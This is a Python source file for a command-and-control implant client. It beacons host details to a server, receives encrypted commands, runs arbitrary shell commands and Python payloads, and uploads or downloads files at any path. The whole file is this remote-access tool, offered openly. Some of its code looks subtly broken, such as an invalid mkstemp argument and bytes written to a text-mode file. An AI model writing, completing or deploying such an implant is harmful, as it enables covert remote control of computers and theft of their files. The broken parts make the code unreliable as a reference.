import socket
import json
import threading
import time
import subprocess
import platform
import logging
from queue import Queue
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes, hmac
from cryptography.hazmat.primitives.asymmetric import padding
import os
import sys
import base64
import importlib.util
import tempfile
import uuid

class C2Client:
    def __init__(self, server_host='127.0.0.1', server_port=5000, interval=5):
        self.server_host = server_host
        self.server_port = server_port
        self.interval = interval
        self.socket = None
        self.connected = False
        self.symmetric_key = None
        self.hmac_key = None
        self.cipher_suite = None
        self.executed_payloads = set()  # Keep track of executed payloads
        self.command_queue = Queue()
        self.socket_lock = threading.Lock()  # Lock for socket access
        self.key_lock = threading.Lock()     # Lock for encryption keys
        self.executed_payloads_lock = threading.Lock()  # Lock for executed_payloads set
        self.last_activity = time.time()
        self.payloads_executed = {}  # Track executed payloads by ID
        
        # Ensure logs directory exists
        os.makedirs('../logs', exist_ok=True)
        
        logging.basicConfig(
            level=logging.DEBUG,
            format='%(asctime)s - %(levelname)s: %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler('../logs/c2_client.log')
            ]
        )
        self.logger = logging.getLogger('C2Client')
        self.logger.info("C2 Client initialized")
    
    def connect(self):
        """Connect to the C2 server and perform key exchange"""
        self.logger.info(f"Attempting to connect to server at {self.server_host}:{self.server_port}")
        self._connect()
    
    def _connect(self):
        """Internal method to establish connection with server"""
        self.connected = False
        
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(120)
            self.socket.connect((self.server_host, self.server_port))
            self.logger.info("Connected to server")
            
            server_ready = self.socket.recv(1024)
            if server_ready != b'READY_FOR_KEY_EXCHANGE':
                raise ValueError("Server not ready for key exchange")
            
            self.socket.sendall(b'CLIENT_READY')
            
            server_public_key_pem = self.socket.recv(2048)
            server_public_key = serialization.load_pem_public_key(server_public_key_pem)
            
            self.symmetric_key = Fernet.generate_key()
            self.cipher_suite = Fernet(self.symmetric_key)
            self.hmac_key = os.urandom(32)
            
            encrypted_symmetric_key = server_public_key.encrypt(
                self.symmetric_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            encrypted_hmac_key = server_public_key.encrypt(
                self.hmac_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            self.socket.sendall(f"{len(encrypted_symmetric_key):010d}".encode())
            self.socket.sendall(f"{len(encrypted_hmac_key):010d}".encode())
            self.socket.sendall(encrypted_symmetric_key)
            self.socket.sendall(encrypted_hmac_key)
            
            exchange_result = self.socket.recv(1024)
            if exchange_result != b'KEY_EXCHANGE_COMPLETE':
                raise ValueError("Key exchange failed")
            
            self.logger.info("Successful key exchange")
            
            self.connected = True
            
            # Start threads
            command_thread = threading.Thread(target=self.receive_commands, daemon=True)
            command_thread.start()
            
            status_thread = threading.Thread(target=self.send_system_status, daemon=True)
            status_thread.start()
            
            process_thread = threading.Thread(target=self.process_command_queue, daemon=True)
            process_thread.start()
            
            return True
        
        except Exception as e:
            self.logger.error(f"Connection error: {e}")
            self.cleanup()
            return False
    
    def send_system_status(self):
        """Periodically send system status to server"""
        while self.connected:
            try:
                status = {
                    'type': 'system_status',
                    'timestamp': time.time(),
                    'system_info': self.get_system_info()
                }
                self.send_response(status)
                time.sleep(self.interval)
            except Exception as e:
                self.logger.error(f"System status error: {e}")
                time.sleep(5)
    
    def send_response(self, response):
        """Send encrypted response to server"""
        try:
            with self.socket_lock:
                if not self.socket:
                    raise RuntimeError("No active socket connection")
                
                encrypted_response = self.cipher_suite.encrypt(
                    json.dumps(response).encode()
                )
                h = hmac.HMAC(self.hmac_key, hashes.SHA256())
                h.update(encrypted_response)
                response_hmac = h.finalize()
                
                data_length = len(encrypted_response).to_bytes(4, 'big')
                self.socket.sendall(data_length)
                self.socket.sendall(encrypted_response)
                self.socket.sendall(response_hmac)
                
                # Update last activity time
                self.last_activity = time.time()
        
        except Exception as e:
            self.logger.error(f"Failed to send response: {e}")
            self.cleanup()
            self._connect()
    
    def receive_commands(self):
        """Main loop to receive and process commands from server"""
        while self.connected:
            try:
                with self.socket_lock:
                    if not self.socket:
                        break
                    
                    length_bytes = self.socket.recv(4)
                    if len(length_bytes) != 4:
                        break
                    data_length = int.from_bytes(length_bytes, 'big')
                    
                    encrypted_data = b''
                    while len(encrypted_data) < data_length:
                        chunk = self.socket.recv(data_length - len(encrypted_data))
                        if not chunk:
                            break
                        encrypted_data += chunk
                    
                    if len(encrypted_data) != data_length:
                        break
                    
                    encrypted_hmac = self.socket.recv(32)
                    if len(encrypted_hmac) != 32:
                        break
                    
                    h = hmac.HMAC(self.hmac_key, hashes.SHA256())
                    h.update(encrypted_data)
                    try:
                        h.verify(encrypted_hmac)
                    except Exception:
                        continue
                    
                    data = self.cipher_suite.decrypt(encrypted_data).decode()
                    command = json.loads(data)
                    
                    # Update last activity time
                    self.last_activity = time.time()
                    
                    # Process command in a separate thread to avoid blocking
                    threading.Thread(
                        target=self.process_command,
                        args=(command,),
                        daemon=True
                    ).start()
            
            except Exception as e:
                self.logger.error(f"Error receiving command: {e}")
                break
        
        self.cleanup()
        self._connect()
    
    def cleanup(self):
        """Clean up resources and close connections"""
        self.connected = False
        with self.socket_lock:
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass
                self.socket = None
    
    def disconnect(self):
        """Disconnect from the server"""
        self.logger.info("Disconnecting from server")
        self.cleanup()
    
    def process_command_queue(self):
        """Process commands from the queue"""
        while self.connected:
            try:
                # Get command from queue with a timeout to allow checking connected state
                try:
                    command = self.command_queue.get(timeout=1)
                    self.process_command(command)
                    self.command_queue.task_done()
                except Exception as e:  # Using general Exception since Queue.Empty may not be accessible
                    continue
            except Exception as e:
                self.logger.error(f"Error processing command queue: {e}")
                time.sleep(1)
    
    def process_command(self, command):
        """Process incoming commands from the server"""
        try:
            command_type = command.get('type')
            command_id = command.get('id', 'unknown')
            
            self.logger.debug(f"Processing command type: {command_type}, id: {command_id}")
            
            if command_type == 'heartbeat':
                # Just log it if you want to track heartbeats
                self.logger.debug("Heartbeat received from server")
                return
            
            if command_type == 'initial_payload' or command_type == 'payload':
                try:
                    payload = command.get('payload')
                    payload_id = command.get('payload_id', 'unknown')
                    
                    # Check if we've already executed this payload
                    with self.executed_payloads_lock:
                        if payload_id in self.executed_payloads:
                            self.logger.info(f"Payload {payload_id} already executed, skipping")
                            return
                    
                    if payload:
                        # Execute the payload
                        self.logger.info(f"Executing payload {payload_id}")
                        result = self._execute_payload(payload)
                        
                        # Mark payload as executed
                        with self.executed_payloads_lock:
                            self.executed_payloads.add(payload_id)
                        
                        # Send result back to server
                        response = {
                            'type': 'payload_result',
                            'payload_id': payload_id,
                            'status': result.get('status', 'error'),
                            'output': result.get('output', ''),
                            'error': result.get('error', '')
                        }
                        self.send_response(response)
                except Exception as e:
                    self.logger.error(f"Failed to execute payload: {e}")
                    response = {
                        'type': 'payload_result',
                        'payload_id': payload_id if 'payload_id' in locals() else 'unknown',
                        'status': 'error',
                        'error': str(e)
                    }
                    self.send_response(response)
                return
            
            if command_type == 'shell':
                cmd = command.get('cmd')
                if not cmd:
                    self.logger.warning("Shell command received with no 'cmd' field")
                    return
                
                self.logger.info(f"Executing shell command: {cmd}")
                result = subprocess.run(
                    cmd, 
                    shell=True, 
                    capture_output=True, 
                    text=True,
                    timeout=60  # 1-minute timeout
                )
                response = {
                    'type': 'shell_result',
                    'id': command_id,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode
                }
                self.send_response(response)
            
            elif command_type == 'system_info':
                info = self.get_system_info()
                info['type'] = 'system_info_result'
                info['id'] = command_id
                self.send_response(info)
            
            elif command_type == 'file_upload':
                file_content = command.get('data')
                file_path = command.get('path')
                if file_content and file_path:
                    try:
                        # Make sure directory exists
                        os.makedirs(os.path.dirname(file_path), exist_ok=True)
                        # Decode base64 content
                        file_bytes = base64.b64decode(file_content)
                        with open(file_path, 'wb') as f:
                            f.write(file_bytes)
                        response = {
                            'type': 'file_upload_result',
                            'id': command_id,
                            'status': 'success',
                            'path': file_path
                        }
                    except Exception as e:
                        response = {
                            'type': 'file_upload_result',
                            'id': command_id,
                            'status': 'error',
                            'error': str(e)
                        }
                    self.send_response(response)
            
            elif command_type == 'file_download':
                file_path = command.get('path')
                if file_path:
                    try:
                        with open(file_path, 'rb') as f:
                            file_content = base64.b64encode(f.read()).decode()
                        response = {
                            'type': 'file_download_result',
                            'id': command_id,
                            'status': 'success',
                            'path': file_path,
                            'data': file_content
                        }
                    except Exception as e:
                        response = {
                            'type': 'file_download_result',
                            'id': command_id,
                            'status': 'error',
                            'error': str(e)
                        }
                    self.send_response(response)
            
            else:
                self.logger.warning(f"Unknown command type: {command_type}")
        
        except Exception as e:
            self.logger.error(f"Command processing error: {e}")
    
    def _execute_payload(self, payload):
        """Execute a payload and return the result"""
        try:
            self.logger.debug("Creating temporary file for payload execution")
            # Create a temporary file to store the payload
            fd, path = tempfile.mkstemp(delete=False, suffix='.py')
            
            with os.fdopen(fd, 'w') as f:
                f.write(payload.encode())
            
            try:
                self.logger.debug(f"Executing payload from {path}")
                # Execute the payload
                result = subprocess.run(
                    [sys.executable, path],
                    capture_output=True,
                    text=True,
                    timeout=300  # 5-minute timeout
                )
                
                return {
                    'status': 'success' if result.returncode == 0 else 'error',
                    'output': result.stdout,
                    'error': result.stderr,
                    'returncode': result.returncode
                }
            
            finally:
                # Clean up the temporary file
                try:
                    os.unlink(path)
                    self.logger.debug(f"Deleted temporary file {path}")
                except Exception as e:
                    self.logger.error(f"Failed to delete temporary file: {e}")
        
        except Exception as e:
            self.logger.error(f"Payload execution error: {e}")
            return {
                'status': 'error',
                'error': str(e)
            }
    
    def get_system_info(self):
        """Get system information"""
        return {
            'os': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'hostname': platform.node(),
            'python_version': sys.version,
            'uptime': time.time() - self.last_activity
        }
        
    def execute_payload(self, payload):
        """Alias for _execute_payload to maintain compatibility with tests"""
        return self._execute_payload(payload)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='C2 Client')
    parser.add_argument('--host', default='127.0.0.1', help='Server host')
    parser.add_argument('--port', type=int, default=5000, help='Server port')
    parser.add_argument('--interval', type=int, default=5, help='Status update interval in seconds')
    args = parser.parse_args()
    
    client = C2Client(server_host=args.host, server_port=args.port, interval=args.interval)
    client.connect()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        client.disconnect()

if __name__ == '__main__':
    main()